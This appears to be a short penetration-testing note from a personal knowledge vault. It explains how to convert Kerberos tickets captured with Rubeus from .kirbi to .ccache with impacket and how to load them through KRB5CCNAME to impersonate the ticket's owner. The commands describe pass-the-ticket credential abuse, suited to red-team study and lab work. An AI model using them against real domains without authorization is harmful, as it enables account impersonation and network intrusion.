TGTs and STs are in a `.kirbi` format, which is not compatible with Linux. To import tickets into a Linux session, we have to convert it to .ccache, and also adjust our Kerberos realm configuration (see [[Kerberos Config (krb5.conf)]])

Using Kerberos Tickets
```bash
# Capture and convert ticket
echo "[BASE64_STRING_FROM_RUBEUS]" | base64 -d > captured_tgt.kirbi 
impacket-ticketConverter captured_tgt.kirbi captured_tgt.ccache

# Adjust Kerberos realm (.krb5) configuration file

# Impersonate
export KRB5CCNAME=/path/to/captured_tgt.ccache 

# Drop impersonation
unset KRB5CCNAME
rm captured_tgt.kirbi captured_tgt.ccache
```